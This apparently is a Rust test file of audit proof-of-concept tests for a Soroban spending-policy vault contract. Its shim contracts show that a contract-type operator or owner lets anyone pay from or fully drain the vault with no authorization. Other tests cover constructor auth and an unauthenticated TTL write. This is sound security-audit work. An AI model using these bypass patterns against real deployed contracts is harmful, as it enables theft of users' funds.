//! A1 audit proof-of-concept tests. NOT part of the shipped suite.

extern crate std;

use super::{setup, UNIT};
use soroban_sdk::testutils::{Address as _, MockAuth, MockAuthInvoke};
use soroban_sdk::{contract, contractimpl, token, Address, Env, IntoVal};

use crate::{AgentSpendPolicy, AgentSpendPolicyClient};

// ── shims ─────────────────────────────────────────────────────────────────────────

/// A contract that simply forwards to `pay`. Stands in for an "agent" implemented as a
/// smart account / passkey account / router rather than as a classic G-account.
#[contract]
pub struct OperatorShim;

#[contractimpl]
impl OperatorShim {
    pub fn go(env: Env, vault: Address, to: Address, amount: i128) {
        AgentSpendPolicyClient::new(&env, &vault).pay(&to, &amount);
    }
}

/// A contract that simply forwards to `withdraw`.
#[contract]
pub struct OwnerShim;

#[contractimpl]
impl OwnerShim {
    pub fn drain(env: Env, vault: Address, to: Address, amount: i128) {
        AgentSpendPolicyClient::new(&env, &vault).withdraw(&to, &amount);
    }
}

// ── A1-02: the direct-call rule makes a contract operator/owner unauthenticated ────

#[test]
fn poc_a_contract_operator_lets_anyone_spend_with_no_signature_at_all() {
    let env = Env::default();
    let owner = Address::generate(&env);
    let payee = Address::generate(&env);
    let issuer = Address::generate(&env);
    let sac = env.register_stellar_asset_contract_v2(issuer);
    let token_id = sac.address();

    // The owner points the operator at a contract, not a keypair.
    let shim = env.register(OperatorShim, ());

    let vault = env.register(
        AgentSpendPolicy,
        (
            owner.clone(),
            shim.clone(),
            token_id.clone(),
            100 * UNIT,
            100 * UNIT,
        ),
    );

    env.mock_all_auths();
    token::StellarAssetClient::new(&env, &token_id).mint(&vault, &(10 * UNIT));

    // Full enforcing auth, zero authorization entries. Nobody signed anything.
    env.set_auths(&[]);

    OperatorShimClient::new(&env, &shim).go(&vault, &payee, &UNIT);

    assert_eq!(
        token::Client::new(&env, &token_id).balance(&payee),
        UNIT,
        "a payment settled with no authorization entry in the transaction"
    );
}

#[test]
fn poc_a_contract_owner_lets_anyone_withdraw_the_entire_balance() {
    let env = Env::default();
    let operator = Address::generate(&env);
    let attacker = Address::generate(&env);
    let issuer = Address::generate(&env);
    let sac = env.register_stellar_asset_contract_v2(issuer);
    let token_id = sac.address();

    let shim = env.register(OwnerShim, ());

    let vault = env.register(
        AgentSpendPolicy,
        (
            shim.clone(),
            operator.clone(),
            token_id.clone(),
            1i128,
            1i128,
        ),
    );

    env.mock_all_auths();
    token::StellarAssetClient::new(&env, &token_id).mint(&vault, &(10 * UNIT));
    env.set_auths(&[]);

    OwnerShimClient::new(&env, &shim).drain(&vault, &attacker, &(10 * UNIT));

    assert_eq!(
        token::Client::new(&env, &token_id).balance(&attacker),
        10 * UNIT,
        "the whole vault left with no authorization entry in the transaction"
    );
}

// ── coverage probes: these are EXPECTED TO PASS on current code ───────────────────

/// Does the operator's authorization bind the payee and the amount?
#[test]
fn coverage_operator_auth_for_one_payee_cannot_be_reused_for_another() {
    let s = setup(100 * UNIT, 100 * UNIT);
    s.fund_vault(10 * UNIT);
    s.enforce_auth();

    let args = (s.payee.clone(), UNIT).into_val(&s.env);
    s.env.mock_auths(&[MockAuth {
        address: &s.operator,
        invoke: &MockAuthInvoke {
            contract: &s.contract_id,
            fn_name: "pay",
            args,
            sub_invokes: &[],
        },
    }]);

    assert!(
        s.client().try_pay(&s.stranger, &UNIT).is_err(),
        "an authorization scoped to one payee must not settle a payment to another"
    );

    s.enforce_auth();
    let args2 = (s.payee.clone(), UNIT).into_val(&s.env);
    s.env.mock_auths(&[MockAuth {
        address: &s.operator,
        invoke: &MockAuthInvoke {
            contract: &s.contract_id,
            fn_name: "pay",
            args: args2,
            sub_invokes: &[],
        },
    }]);
    assert!(
        s.client().try_pay(&s.payee, &(2 * UNIT)).is_err(),
        "an authorization scoped to one amount must not settle a larger one"
    );
}

/// A third party who is neither owner nor operator.
#[test]
fn coverage_a_stranger_cannot_call_any_owner_function() {
    let s = setup(100 * UNIT, 100 * UNIT);
    s.fund_vault(10 * UNIT);
    let other = Address::generate(&s.env);

    for (name, args) in [
        ("set_frozen", (true,).into_val(&s.env)),
        ("set_policy", (0i128, 0i128, false).into_val(&s.env)),
        ("set_allowed", (s.payee.clone(), true).into_val(&s.env)),
        ("set_operator", (other.clone(),).into_val(&s.env)),
        ("set_session_key_expiry", (0u64,).into_val(&s.env)),
        ("withdraw", (s.payee.clone(), UNIT).into_val(&s.env)),
        ("owner_pay", (s.payee.clone(), UNIT).into_val(&s.env)),
    ] {
        s.enforce_auth();
        s.env.mock_auths(&[MockAuth {
            address: &s.stranger,
            invoke: &MockAuthInvoke {
                contract: &s.contract_id,
                fn_name: name,
                args,
                sub_invokes: &[],
            },
        }]);
        let c = s.client();
        let failed = match name {
            "set_frozen" => c.try_set_frozen(&true).is_err(),
            "set_policy" => c.try_set_policy(&0, &0, &false).is_err(),
            "set_allowed" => c.try_set_allowed(&s.payee, &true).is_err(),
            "set_operator" => c.try_set_operator(&other).is_err(),
            "set_session_key_expiry" => c.try_set_session_key_expiry(&0).is_err(),
            "withdraw" => c.try_withdraw(&s.payee, &UNIT).is_err(),
            "owner_pay" => c.try_owner_pay(&s.payee, &UNIT).is_err(),
            _ => unreachable!(),
        };
        assert!(failed, "a stranger must not be able to call {name}");
    }
}

/// `set_allowed` is the one owner function missing from the operator loop in auth.rs.
#[test]
fn coverage_the_operator_cannot_call_set_allowed() {
    let s = setup(100 * UNIT, 100 * UNIT);
    s.enforce_auth();
    let args = (s.payee.clone(), true).into_val(&s.env);
    s.env.mock_auths(&[MockAuth {
        address: &s.operator,
        invoke: &MockAuthInvoke {
            contract: &s.contract_id,
            fn_name: "set_allowed",
            args,
            sub_invokes: &[],
        },
    }]);
    assert!(s.client().try_set_allowed(&s.payee, &true).is_err());
}

/// INV-04: every view is callable with no authorization and changes no policy state.
#[test]
fn coverage_all_thirteen_views_need_no_auth_and_mutate_no_policy_state() {
    let s = setup(100 * UNIT, 7 * UNIT);
    s.fund_vault(10 * UNIT);

    // Put some state on the board first.
    s.mock_auths();
    s.client().set_allowed(&s.payee, &true);
    s.client().set_session_key_expiry(&12345);
    s.client().pay(&s.payee, &UNIT);

    let before = (
        s.client().owner(),
        s.client().operator(),
        s.client().token(),
        s.client().decimals(),
        s.client().daily_cap(),
        s.client().auto_approve_max(),
        s.client().frozen(),
        s.client().allowlist_enabled(),
        s.client().session_key_expiry(),
        s.client().is_allowed(&s.payee),
        s.client().spent_today(),
        s.client().balance(),
    );

    // Now with authorization fully enforced and no entries at all.
    s.enforce_auth();
    let c = s.client();
    let after = (
        c.owner(),
        c.operator(),
        c.token(),
        c.decimals(),
        c.daily_cap(),
        c.auto_approve_max(),
        c.frozen(),
        c.allowlist_enabled(),
        c.session_key_expiry(),
        c.is_allowed(&s.payee),
        c.spent_today(),
        c.balance(),
    );
    let _ = c.today();

    assert_eq!(before, after, "a view changed observable state");
    assert_eq!(
        s.token().balance(&s.contract_id),
        9 * UNIT,
        "a view moved value"
    );
}

/// Control for the two PoCs above: the same shim, the same zero-auth transaction, but the
/// shim is NOT the stored operator. This must fail, which proves the PoCs succeed because
/// of the invoker-contract rule and not because `set_auths(&[])` failed to enforce.
#[test]
fn poc_control_a_shim_that_is_not_the_operator_still_fails() {
    let env = Env::default();
    let owner = Address::generate(&env);
    let operator = Address::generate(&env);
    let payee = Address::generate(&env);
    let issuer = Address::generate(&env);
    let sac = env.register_stellar_asset_contract_v2(issuer);
    let token_id = sac.address();

    let shim = env.register(OperatorShim, ());
    let vault = env.register(
        AgentSpendPolicy,
        (
            owner.clone(),
            operator.clone(),
            token_id.clone(),
            100 * UNIT,
            100 * UNIT,
        ),
    );

    env.mock_all_auths();
    token::StellarAssetClient::new(&env, &token_id).mint(&vault, &(10 * UNIT));
    env.set_auths(&[]);

    assert!(
        OperatorShimClient::new(&env, &shim)
            .try_go(&vault, &payee, &UNIT)
            .is_err(),
        "a contract that is not the stored operator must not be able to pay"
    );
    assert_eq!(token::Client::new(&env, &token_id).balance(&payee), 0);
}

// ── lead 3: what does __constructor actually require anyone to authorize? ─────────

mod real_wasm {
    pub const WASM: &[u8] =
        include_bytes!("../../../../target/wasm32v1-none/release/agent_spend_policy.wasm");
}

/// Deploys the way production deploys (real wasm, `Env::deployer`) under RECORDING auth,
/// then reads the resulting authorization tree. Per the soroban-sdk 27.0.6 docs, `register`
/// mocks constructor auth and "cannot be used to test a constructor's authorization"; the
/// deployer path runs the constructor subject to the environment's authorization.
#[test]
fn poc_the_constructor_requires_no_authorization_from_the_owner() {
    let env = Env::default();
    let deployer = Address::generate(&env);
    let owner = Address::generate(&env);
    let operator = Address::generate(&env);
    let issuer = Address::generate(&env);
    let token_id = env.register_stellar_asset_contract_v2(issuer).address();

    env.mock_all_auths();
    let hash = env.deployer().upload_contract_wasm(real_wasm::WASM);
    let salt = soroban_sdk::BytesN::from_array(&env, &[7u8; 32]);

    let vault = env.deployer().with_address(deployer.clone(), salt).deploy_v2(
        hash,
        (
            owner.clone(),
            operator.clone(),
            token_id.clone(),
            100i128,
            100i128,
        ),
    );

    let auths = env.auths();
    std::println!("--- constructor auth tree ---");
    for (who, inv) in &auths {
        std::println!("  authorizer: {who:?}");
        std::println!("  invocation: {:?}", inv.function);
    }
    std::println!("--- owner-as-stored: {:?}", AgentSpendPolicyClient::new(&env, &vault).owner());

    assert!(
        !auths.iter().any(|(who, _)| *who == owner),
        "the address named as owner authorized the constructor"
    );
    assert!(
        auths.iter().any(|(who, _)| *who == deployer),
        "the deployer is the only authorizer"
    );
}

/// INV-04 boundary: `is_allowed` is a *view* that performs a ledger write (a TTL
/// extension) and it is reachable by anyone with no authorization at all.
#[test]
fn poc_the_is_allowed_view_extends_a_ttl_with_no_authorization() {
    use crate::storage::{DataKey, LONG_TTL_EXTEND};
    use soroban_sdk::testutils::storage::Persistent as _;
    let s = setup(100 * UNIT, 100 * UNIT);
    s.mock_auths();
    s.client().set_allowed(&s.payee, &true);

    let key = DataKey::Allowed(s.payee.clone());
    let read_ttl = || {
        s.env.as_contract(&s.contract_id, || {
            s.env.storage().persistent().get_ttl(&key)
        })
    };
    let t0 = read_ttl();
    // Past LONG_TTL_THRESHOLD, so the next read is eligible for an extension.
    s.advance_ledgers(1_700_000);
    let t1 = read_ttl();
    assert!(t1 < t0, "TTL should have decayed with the ledger sequence");

    // Fully enforcing, zero authorization entries, an anonymous caller.
    s.enforce_auth();
    assert!(s.client().is_allowed(&s.payee));
    let t2 = read_ttl();

    std::println!("ttl before={t0} after 1000 ledgers={t1} after an anonymous is_allowed()={t2}");
    assert_eq!(t2, LONG_TTL_EXTEND, "an unauthenticated view wrote to the ledger");
    assert!(t2 > t1, "the view extended the entry's lifetime");
}
